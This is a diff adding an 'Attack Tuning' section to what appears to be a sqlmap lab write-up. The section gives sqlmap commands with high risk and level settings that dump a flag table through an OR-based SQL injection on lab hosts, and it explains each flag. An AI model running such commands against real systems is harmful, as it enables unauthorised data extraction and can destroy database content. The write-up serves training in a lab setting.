@@ -79,6 +79,33 @@ While it is applicable in this lab, we may also use the following command.
 
 `sqlmap -u 'http://94.237.50.242:49319/case4.php'  --data={'"id":1'} --batch --dump  -T flag4`
 
+# Attack Tuning
+
+Sqlmap comes right off the bat as a very strong tool, though it is capable to do more with some tuning by using flags that increase the accuracy of your scan. These may include flags for Level/Risk, Status Codes, Text and Techniques etc.
+
+In this section we will use some of the above-mentioned flags that will dig deeper in our scans inorder to achive our goals. Follow me as we do it.
+
+Questions
+
+`1. What's the contents of table flag5? (Case #5) `
+
+This challenges indicaes an OR SQLi vulnerability for the parameter 'id'. For this we will have to use the Level/Risk flags by raising the risk level. This is done because OR payloads are inherently dangerous in a default run, where underlying vulnerable SQL statements are actively modifying the database content 
+
+`sqlmap -u http://83.136.248.62:52853/case5.php?id=1 -T flag5 --no-cast --dump --batch --risk 3 --level 5`
+
+`sqlmap -u http://83.136.248.62:52853/case5.php?id=1 -T flag5 --no-cast --dump --batch --risk 3 --level 5 -dbs testdb -dbms MYSQL`
+
+From the command:
+
+     --no-cast - This flag ensures that you get the correct content. 
+     --risk - [1-3]  extends the risk of causing problems at the target side (i.e., risk of database entry loss or denial-of-service).
+     --level - [1-5] extends  boundaries being used, based on their expectancy of success (i.e., the lower the expectancy, the higher the level).
+     --dbs - The database in question.
+     --dbms - The underlying Database schema being used.
+
+
+
+
 
 
 
